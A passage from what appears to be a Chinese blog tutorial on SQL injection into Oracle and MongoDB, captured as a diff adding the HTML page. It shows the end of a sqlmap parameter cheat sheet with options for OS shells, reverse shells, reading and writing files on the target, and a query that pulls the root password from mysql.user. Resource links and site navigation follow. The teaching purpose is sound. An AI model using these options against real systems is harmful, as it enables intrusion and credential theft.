6：显示HTTP响应页面的内容</span><br><span class="line">--privileges  #查看权限 </span><br><span class="line">--is-dba      #是否是数据库管理员 </span><br><span class="line">--roles       #枚举数据库用户角色 </span><br><span class="line">--udf-inject  #导入用户自定义函数（获取系统权限） </span><br><span class="line">--union-check  #是否支持union 注入 </span><br><span class="line">--union-cols #union 查询表记录 </span><br><span class="line">--union-test #union 语句测试 </span><br><span class="line">--union-use  #采用union 注入 </span><br><span class="line">--union-tech orderby #union配合order by </span><br><span class="line">--data &quot;&quot; #POST方式提交数据(--data &quot;page=1&amp;id=2&quot;) </span><br><span class="line">--cookie &quot;用;号分开&quot;      #cookie注入(--cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) </span><br><span class="line">--referer &quot;&quot;     #使用referer欺骗(--referer &quot;http://www.baidu.com&quot;) </span><br><span class="line">--user-agent &quot;&quot;  #自定义user-agent </span><br><span class="line">--proxy &quot;http://127.0.0.1:8118&quot; #代理注入 </span><br><span class="line">--string=&quot;&quot;    #指定关键词,字符串匹配. </span><br><span class="line">--threads     #采用多线程(--threads 3) </span><br><span class="line">--sql-shell    #执行指定sql命令 </span><br><span class="line">--sql-query    #执行指定的sql语句(--sql-query &quot;SELECT password FROM mysql.user WHERE user = &#x27;root&#x27; LIMIT 0, 1&quot; ) </span><br><span class="line">--file-read    #读取指定文件 </span><br><span class="line">--file-write   #写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) </span><br><span class="line">--file-dest    #要写入的文件绝对路径 </span><br><span class="line">--os-cmd=id    #执行系统命令 </span><br><span class="line">--os-shell     #系统交互shell </span><br><span class="line">--os-pwn       #反弹shell(--os-pwn --msf-path=/opt/framework/msf3/) </span><br><span class="line">--msf-path=    #matesploit绝对路径(--msf-path=/opt/framework/msf3/) </span><br><span class="line">--os-smbrelay  # </span><br><span class="line">--os-bof       # </span><br><span class="line">--reg-read     #读取win系统注册表 </span><br><span class="line">--priv-esc     # </span><br><span class="line">--time-sec=    #延迟设置 默认--time-sec=5 为5秒 </span><br><span class="line">-p &quot;user-agent&quot; --user-agent &quot;sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)&quot;  #指定user-agent注入 </span><br><span class="line">--eta          #盲注 </span><br><span class="line">/pentest/database/sqlmap/txt/</span><br><span class="line">common-columns.txt  字段字典  　 </span><br><span class="line">common-outputs.txt</span><br><span class="line">common-tables.txt      表字典</span><br><span class="line">keywords.txt</span><br><span class="line">oracle-default-passwords.txt</span><br><span class="line">user-agents.txt</span><br><span class="line">wordlist.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/bmjoker/p/9326258.html</span><br><span class="line"></span><br><span class="line">https://github.com/youngyangyang04/NoSQLAttack</span><br><span class="line"></span><br><span class="line">https://github.com/sqlmapproject/sqlmap/zipball/master</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/qq_39936434/category_9103379.html</span><br><span class="line"></span><br><span class="line">https://www.mozhe.cn/bug/WUJ3OGVQSTIyeXdvbHU2ZmV0MjVDUT09bW96aGUmozhe</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2021/09/21/15WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOracle%E3%80%81MongoDB%E6%B3%A8%E5%85%A5/">15WEB漏洞--SQL注入之Oracle、MongoDB注入</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">Al0nez</a></p>
+        <p><span>发布时间:</span>2021-09-21, 10:29:13</p>
+        <p><span>最后更新:</span>2021-09-21, 11:22:22</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2021/09/21/15WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOracle%E3%80%81MongoDB%E6%B3%A8%E5%85%A5/" title="15WEB漏洞--SQL注入之Oracle、MongoDB注入">https://al0nez.github.io/2021/09/21/15WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOracle%E3%80%81MongoDB%E6%B3%A8%E5%85%A5/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://al0nez.github.io/2021/09/21/15WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOracle%E3%80%81MongoDB%E6%B3%A8%E5%85%A5/　　作者: Al0nez" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2021/09/21/16WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F%E5%8F%8A%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8/">
+                    16WEB漏洞--SQL注入之查询方式及报错盲注
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2021/09/21/14WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5/">
+                    14WEB漏洞--SQL注入之类型及提交注入
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.</span> <span class="toc-text">数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E5%86%B3%E5%AE%9A%E7%BD%91%E7%AB%99%E6%B3%A8%E5%85%A5%E7%82%B9%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%EF%BC%9F"><span class="toc-number">1.1.</span> <span class="toc-text">什么决定网站注入点用户权限？</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E8%A6%81%E5%AD%A6%E4%B9%A0%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5%E7%89%B9%E7%82%B9"><span class="toc-number">2.</span> <span class="toc-text">简要学习各种数据库的注入特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Access%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">Access注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">3.1.</span> <span class="toc-text">判断注入点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E4%B8%8D%E6%98%AFaccess%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">3.2.</span> <span class="toc-text">判断是不是access数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">3.3.</span> <span class="toc-text">联合注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%8C%9C%E8%A7%A3%E8%A1%A8%E5%90%8D"><span class="toc-number">3.3.1.</span> <span class="toc-text">猜解表名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%8C%9C%E8%A7%A3%E5%88%97%E5%90%8D"><span class="toc-number">3.3.2.</span> <span class="toc-text">猜解列名</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5"><span class="toc-number">3.4.</span> <span class="toc-text">偏移注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-server-MSSQL%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">SQL server&#x2F;MSSQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PostgraSQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">5.</span> <span class="toc-text">PostgraSQL注入原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Oracle%E6%B3%A8%E5%85%A5"><span class="toc-number">6.</span> <span class="toc-text">Oracle注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MongoDB%E6%B3%A8%E5%85%A5"><span class="toc-number">7.</span> <span class="toc-text">MongoDB注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sqlmap"><span class="toc-number">8.</span> <span class="toc-text">Sqlmap</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sqlmap%E6%94%AF%E6%8C%81%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">8.1.</span> <span class="toc-text">sqlmap支持的数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E6%95%B0"><span class="toc-number">8.2.</span> <span class="toc-text">参数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B6%89%E5%8F%8A%E8%B5%84%E6%BA%90"><span class="toc-number">9.</span> <span class="toc-text">涉及资源</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-4 i,
+        .toc-level-4 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2021/09/21/16WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F%E5%8F%8A%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8/" title="上一篇: 16WEB漏洞--SQL注入之查询方式及报错盲注">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2021/09/21/14WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5/" title="下一篇: 14WEB漏洞--SQL注入之类型及提交注入">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/37WEB%E6%BC%8F%E6%B4%9E-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP/">37WEB漏洞-反序列化之PHP</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/36WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/">36WEB漏洞-逻辑越权之验证码与Token及接口</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/35WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E5%8F%8A%E6%8E%A5%E5%8F%A3%E7%88%86%E7%A0%B4/">35WEB漏洞-逻辑越权之找回机制及接口爆破</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/34WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%94%AF%E4%BB%98%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9%E5%AE%89%E5%85%A8/">34WEB漏洞-逻辑越权之支付数据篡改安全</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/33WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/">33WEB漏洞-逻辑越权之水平垂直越权全解</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/32WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/">32WEB漏洞-文件操作之文件下载读取全解</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/31WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/">31WEB漏洞-文件操作之文件包含漏洞全解</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/30WEB%E6%BC%8F%E6%B4%9E-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/">30WEB漏洞-RCE代码及命令执行漏洞全解</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/29WEB%E6%BC%8F%E6%B4%9E-CSRF%E5%8F%8ASSRF%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E8%AE%B2%E8%A7%A3/">29WEB漏洞-CSRF及SSRF漏洞案例讲解</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/28WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D/">28WEB漏洞-XSS跨站之WAF绕过及安全修复</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/27WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E4%BB%A3%E7%A0%81%E5%8F%8Ahttponly%E7%BB%95%E8%BF%87/">27WEB漏洞-XSS跨站之代码及httponly绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/26WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E8%AE%A2%E5%8D%95%E5%8F%8AShell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80%E8%AE%B0/">26WEB漏洞-XSS跨站之订单及Shell箱子反杀记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/25WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E5%8E%9F%E7%90%86%E5%88%86%E7%B1%BB%E5%8F%8A%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/">25WEB漏洞-XSS跨站之原理分类及攻击手法</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/24WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D/">24WEB漏洞-文件上传之WAF绕过及安全修复</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/23WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E7%BC%96%E8%BE%91%E5%99%A8%E5%AE%89%E5%85%A8/">23WEB漏洞-文件上传之解析漏洞编辑器安全</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/22WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E5%86%85%E5%AE%B9%E9%80%BB%E8%BE%91%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87/">22WEB漏洞-文件上传之内容逻辑数组绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/21WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E5%90%8E%E7%AB%AF%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/">21WEB漏洞--文件上传之后端黑白名单绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/20WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E5%9F%BA%E7%A1%80%E5%8F%8A%E8%BF%87%E6%BB%A4%E6%96%B9%E5%BC%8F/">20WEB漏洞--文件上传之基础及过滤方式</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/19WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%B7%B1%E5%85%A5WAF%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/">19WEB漏洞--SQL注入之深入WAF注入绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/18WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%A0%86%E5%8F%A0%E5%8F%8AWAF%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5/">18WEB漏洞--SQL注入之堆叠及WAF绕过注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/17WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E4%BA%8C%E6%AC%A1%E3%80%81%E5%8A%A0%E8%A7%A3%E5%AF%86%E3%80%81DNS%E7%AD%89%E6%B3%A8%E5%85%A5/">17WEB漏洞--SQL注入之二次、加解密、DNS等注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/16WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F%E5%8F%8A%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8/">16WEB漏洞--SQL注入之查询方式及报错盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/15WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOracle%E3%80%81MongoDB%E6%B3%A8%E5%85%A5/">15WEB漏洞--SQL注入之Oracle、MongoDB注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/14WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5/">14WEB漏洞--SQL注入之类型及提交注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/13WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%B3%A8%E5%85%A5/">13WEB漏洞--SQL注入之MYSQL注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/12WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%AE%80%E8%A6%81SQL%E6%B3%A8%E5%85%A5/">12WEB漏洞--SQL注入之简要SQL注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/11WEB%E6%BC%8F%E6%B4%9E-%E5%BF%85%E6%87%82%E7%9F%A5%E8%AF%86/">11WEB漏洞--必懂知识</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/10%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E8%B5%84%E4%BA%A7%E7%9B%91%E6%8E%A7%E6%8B%93%E5%B1%95/">10信息收集-资产监控拓展</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/09%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-APP%E5%8F%8A%E5%85%B6%E4%BB%96%E8%B5%84%E4%BA%A7%E7%AD%89/">09信息收集--APP及其他资产等</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/08%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%9E%B6%E6%9E%84%EF%BC%8C%E6%90%AD%E5%BB%BA%EF%BC%8CWAF/">08信息收集--架构，搭建，WAF</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/07%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-CDN%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF/">07信息收集--CDN绕过技术</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/06%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/">06基础入门--加密编码算法</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/05%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E7%B3%BB%E7%BB%9F%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%BA%93/">05基础入门--系统及数据库</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/04%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-WEB%E6%BA%90%E7%A0%81%E6%8B%93%E5%B1%95/">04基础入门--WEB源码拓展</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/03%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%90%AD%E5%BB%BA%E5%AE%89%E5%85%A8%E6%8B%93%E5%B1%95/">03基础入门--搭建安全拓展</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/12/02%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8B%93%E5%B1%95/">02基础入门--数据包拓展</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/10/01%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%A6%82%E5%BF%B5%E5%90%8D%E8%AF%8D/">01基础入门--概念名词</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2021 Al0nez
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 6;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        $("a[target=_blank]").removeAttr("target");
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
